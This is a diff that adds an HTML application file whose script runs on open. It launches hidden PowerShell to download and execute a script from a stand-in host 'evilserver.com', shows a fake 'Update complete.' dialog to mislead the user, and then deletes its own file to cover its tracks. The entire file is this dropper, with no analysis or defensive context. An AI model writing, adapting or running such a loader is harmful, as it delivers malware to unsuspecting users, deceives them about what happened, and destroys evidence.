@@ -1,0 +1,25 @@
+<HTML>
+
+<HEAD>
+
+<script>
+
+try {
+
+a=new ActiveXObject('Wscript.Shell');
+
+a.Run("PowerShell -nop -noe $d=$env:temp+'\\badguy.ps1';(New-Object System.Net.WebClient).DownloadFile('http://evilserver.com',$d);Start-Process $d;[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[system.windows.forms.messagebox]::show('Update complete.','Information',[Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information);",0,false);var b=new ActiveXObject('Scripting.FileSystemObject');var p = document.location.href;p = unescape(p.substr(8));if (b.FileExists(p))b.DeleteFile(p);
+
+} catch (e) {}
+
+close();
+
+</script>
+
+</HEAD>
+
+<BODY>
+
+</BODY>
+
+</HTML>
